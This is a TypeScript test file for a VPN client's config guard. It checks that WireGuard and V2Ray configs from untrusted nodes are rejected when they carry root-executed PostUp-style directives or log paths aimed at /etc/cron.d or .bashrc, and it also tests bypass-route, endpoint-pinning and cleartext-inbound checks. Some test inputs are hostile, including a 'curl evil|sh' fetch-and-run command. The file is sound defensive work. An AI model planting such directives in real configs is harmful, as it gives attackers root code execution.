import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  assertSafeWireguardConfig,
  extractWireguardEndpointHost,
  isAllowedBypassCidr,
  sanitizeBypassRoutes,
  assertSafeV2RayConfig,
  withV2RayDiagnosticLog,
  pinV2RayNodeAddresses,
  classifyV2RayInbound,
  filterV2RayMetadata,
  isAllCleartext,
  v2raySecurityBadge,
} from './config-guard.ts'

// A representative clean WireGuard config built from a node handshake.
const CLEAN_WG = `[Interface]
PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktYmFzZTY0PT0=
Address = 10.8.0.2/32
DNS = 10.8.0.1
MTU = 1420

[Peer]
PublicKey = c29tZS1wdWJsaWMta2V5LWluLWJhc2U2NC1mb3JtYXQ9
PresharedKey = cHNrLWtleS1iYXNlNjQtZW5jb2RlZC12YWx1ZS09PQ==
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.7:51820
PersistentKeepalive = 25
`

test('assertSafeWireguardConfig accepts a clean Interface/Peer config', () => {
  assert.doesNotThrow(() => assertSafeWireguardConfig(CLEAN_WG))
})

// The core LPE vector: wg-quick executes these directives as root.
for (const directive of ['PostUp', 'PreUp', 'PostDown', 'PreDown', 'Table', 'SaveConfig']) {
  test(`assertSafeWireguardConfig rejects ${directive} directive`, () => {
    const evil = CLEAN_WG.replace('MTU = 1420', `${directive} = /bin/sh -c "curl evil|sh"`)
    assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
  })
}

test('assertSafeWireguardConfig rejects PostUp regardless of case/spacing', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'postup=touch /tmp/pwned')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig rejects an unknown key (allow-list, not blocklist)', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'Whatever = 7')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig ignores comments and blank lines', () => {
  const withComments = `# generated\n\n${CLEAN_WG}\n# trailing comment\n`
  assert.doesNotThrow(() => assertSafeWireguardConfig(withComments))
})

test('assertSafeWireguardConfig rejects a key outside any section', () => {
  assert.throws(() => assertSafeWireguardConfig('PostUp = x\n[Interface]\nPrivateKey = a'), /not allowed|invalid/i)
})

test('extractWireguardEndpointHost returns the host before the port', () => {
  assert.equal(extractWireguardEndpointHost(CLEAN_WG), '203.0.113.7')
})

test('extractWireguardEndpointHost tolerates missing spaces around =', () => {
  assert.equal(extractWireguardEndpointHost('[Peer]\nEndpoint=198.51.100.4:1194'), '198.51.100.4')
})

test('extractWireguardEndpointHost returns null when no Endpoint present', () => {
  assert.equal(extractWireguardEndpointHost('[Interface]\nPrivateKey = a'), null)
})

// H3: split-tunnel bypass routes flow to `ip route add ... via <real gateway>` as root.
test('isAllowedBypassCidr accepts normal private CIDRs', () => {
  assert.equal(isAllowedBypassCidr('10.0.0.0/8'), true)
  assert.equal(isAllowedBypassCidr('192.168.1.0/24'), true)
  assert.equal(isAllowedBypassCidr('203.0.113.7/32'), true)
})

test('isAllowedBypassCidr rejects the default-route swallow vectors', () => {
  assert.equal(isAllowedBypassCidr('0.0.0.0/0'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/1'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/8'), false)
})

test('isAllowedBypassCidr rejects out-of-range octets and prefixes', () => {
  assert.equal(isAllowedBypassCidr('999.0.0.1/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0/33'), false)
  assert.equal(isAllowedBypassCidr('10.0.0/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0'), false)
  assert.equal(isAllowedBypassCidr('garbage'), false)
  assert.equal(isAllowedBypassCidr(''), false)
})

test('sanitizeBypassRoutes drops invalid entries and caps the list', () => {
  assert.deepEqual(sanitizeBypassRoutes(['10.0.0.0/8', '0.0.0.0/0', 'junk']), ['10.0.0.0/8'])
  assert.deepEqual(sanitizeBypassRoutes(['  192.168.0.0/16  ']), ['192.168.0.0/16'])
  assert.equal(sanitizeBypassRoutes(Array(200).fill('10.0.0.0/8')).length <= 64, true)
})

// C2: V2Ray config is spawned as a child process; node operators are untrusted.
const CLEAN_V2RAY = {
  log: { loglevel: 'none' },
  inbounds: [{ protocol: 'socks', listen: '127.0.0.1', port: 1080 }],
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } },
    { protocol: 'freedom' },
  ],
}

test('assertSafeV2RayConfig accepts a clean local-SOCKS / vmess config', () => {
  assert.doesNotThrow(() => assertSafeV2RayConfig(CLEAN_V2RAY))
})

test('assertSafeV2RayConfig rejects a log file path (arbitrary file write vector)', () => {
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { access: '/etc/cron.d/x' } }), /log|not allowed|invalid/i)
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { error: '/home/user/.bashrc' } }), /log|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects an inbound bound to a non-loopback address', () => {
  const evil = { ...CLEAN_V2RAY, inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }] }
  assert.throws(() => assertSafeV2RayConfig(evil), /loopback|listen|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects a config with no outbounds', () => {
  assert.throws(() => assertSafeV2RayConfig({ inbounds: [] }), /outbound|invalid/i)
  assert.throws(() => assertSafeV2RayConfig(null), /invalid/i)
  assert.throws(() => assertSafeV2RayConfig('not an object'), /invalid/i)
})

// The SDK hardcodes log.loglevel = "none", so v2ray is silent and a dead
// outbound (process alive, can't reach node) is undiagnosable. Turn logging on
// without tripping the security guard's "no log file path" rule.
test('withV2RayDiagnosticLog turns logging on at warning level', () => {
  const out = withV2RayDiagnosticLog({ log: { loglevel: 'none' }, outbounds: [{ protocol: 'vmess' }] }) as { log: { loglevel: string; error: string } }
  assert.equal(out.log.loglevel, 'warning')
  // error must route to stderr ('' = stderr), NOT a file path
  assert.equal(out.log.error, '')
})

test('withV2RayDiagnosticLog output still passes the security guard', () => {
  const out = withV2RayDiagnosticLog(CLEAN_V2RAY)
  assert.doesNotThrow(() => assertSafeV2RayConfig(out))
})

test('withV2RayDiagnosticLog preserves the rest of the config and does not mutate input', () => {
  const input = JSON.parse(JSON.stringify(CLEAN_V2RAY))
  const out = withV2RayDiagnosticLog(input) as typeof CLEAN_V2RAY
  assert.deepEqual(out.outbounds, CLEAN_V2RAY.outbounds)
  assert.deepEqual(out.inbounds, CLEAN_V2RAY.inbounds)
  // input untouched (pure)
  assert.deepEqual(input.log, { loglevel: 'none' })
})

// The real-world failure: the node endpoint is a hostname (oizys.busur.cc).
// Once tun2socks routes all DNS through the tunnel, v2ray re-resolving that
// hostname deadlocks. Pinning it to an IP before spawn removes the dependency.
const HOSTNAME_V2RAY = {
  log: { loglevel: 'none' },
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: 'oizys.busur.cc', port: 55215, users: [{ id: 'x' }] }] }, tag: 'grpc' },
    { protocol: 'vless', settings: { vnext: [{ address: 'oizys.busur.cc', port: 55216, users: [{ id: 'x' }] }] }, tag: 'kcp' },
  ],
}
const resolveFixed = (host: string): string | null => (host === 'oizys.busur.cc' ? '103.246.250.10' : null)

test('pinV2RayNodeAddresses replaces a hostname endpoint with its resolved IP', () => {
  const out = pinV2RayNodeAddresses(HOSTNAME_V2RAY, resolveFixed) as typeof HOSTNAME_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, '103.246.250.10')
  assert.equal(out.outbounds[1].settings.vnext[0].address, '103.246.250.10')
  // unrelated fields preserved
  assert.equal(out.outbounds[0].settings.vnext[0].port, 55215)
})

test('pinV2RayNodeAddresses leaves an IP endpoint untouched', () => {
  const out = pinV2RayNodeAddresses(CLEAN_V2RAY, () => { throw new Error('must not resolve an IP') }) as typeof CLEAN_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, '203.0.113.7')
})

test('pinV2RayNodeAddresses leaves an unresolvable hostname as-is (best effort)', () => {
  const out = pinV2RayNodeAddresses(HOSTNAME_V2RAY, () => null) as typeof HOSTNAME_V2RAY
  assert.equal(out.outbounds[0].settings.vnext[0].address, 'oizys.busur.cc')
})

test('pinV2RayNodeAddresses does not mutate input and output passes the guard', () => {
  const input = JSON.parse(JSON.stringify(HOSTNAME_V2RAY))
  const out = pinV2RayNodeAddresses(input, resolveFixed)
  assert.equal(input.outbounds[0].settings.vnext[0].address, 'oizys.busur.cc') // input untouched
  assert.doesNotThrow(() => assertSafeV2RayConfig(out))
})

// --- V2Ray inbound encryption policy ---
//
// VLess has no proxy-layer cipher: VLess + transport_security=none is the only
// cleartext-at-the-proxy combo. VMess (AEAD) and any TLS inbound are encrypted.
// Enum values mirror the SDK: ProxyProtocol VLess=1/VMess=2, TransportSecurity
// None=1/TLS=2, TransportProtocol TCP=7.
const VLESS = 1, VMESS = 2, SEC_NONE = 1, SEC_TLS = 2, TCP = 7
const inbound = (proxy, security) => ({
  port: '443', proxy_protocol: proxy, transport_protocol: TCP, transport_security: security,
})

test('classifyV2RayInbound: VMess and any TLS are acceptable, VLess+none is cleartext', () => {
  assert.equal(classifyV2RayInbound(inbound(VMESS, SEC_NONE)), 'acceptable') // VMess AEAD
  assert.equal(classifyV2RayInbound(inbound(VMESS, SEC_TLS)), 'acceptable')
  assert.equal(classifyV2RayInbound(inbound(VLESS, SEC_TLS)), 'acceptable') // TLS wraps it
  assert.equal(classifyV2RayInbound(inbound(VLESS, SEC_NONE)), 'cleartext')
})

test('filterV2RayMetadata keeps only acceptable inbounds when any exist', () => {
  const mixed = [inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_NONE)]
  const kept = filterV2RayMetadata(mixed)
  assert.equal(kept.length, 1)
  assert.equal(kept[0].proxy_protocol, VMESS)
})

test('filterV2RayMetadata leaves an all-acceptable list intact', () => {
  const ok = [inbound(VMESS, SEC_NONE), inbound(VLESS, SEC_TLS)]
  assert.equal(filterV2RayMetadata(ok).length, 2)
})

test('filterV2RayMetadata returns [] when every inbound is VLess-none', () => {
  assert.deepEqual(filterV2RayMetadata([inbound(VLESS, SEC_NONE), inbound(VLESS, SEC_NONE)]), [])
})

test('isAllCleartext is true only for a non-empty all-cleartext set', () => {
  assert.equal(isAllCleartext([inbound(VLESS, SEC_NONE), inbound(VLESS, SEC_NONE)]), true)
  assert.equal(isAllCleartext([inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_NONE)]), false)
  assert.equal(isAllCleartext([]), false)
})

test('v2raySecurityBadge produces the expected compact label', () => {
  assert.equal(v2raySecurityBadge([inbound(VMESS, SEC_TLS)]), 'VMess+TLS')
  assert.equal(v2raySecurityBadge([inbound(VMESS, SEC_NONE)]), 'VMess')
  assert.equal(v2raySecurityBadge([inbound(VLESS, SEC_TLS)]), 'VLess+TLS')
  const cleartext = v2raySecurityBadge([inbound(VLESS, SEC_NONE)])
  assert.match(cleartext, /VLess/)
  assert.match(cleartext, /⚠/)
})

test('filterV2RayMetadata does not mutate its input array', () => {
  const input = [inbound(VLESS, SEC_NONE), inbound(VMESS, SEC_TLS)]
  const snapshot = JSON.parse(JSON.stringify(input))
  filterV2RayMetadata(input)
  assert.deepEqual(input, snapshot)
})
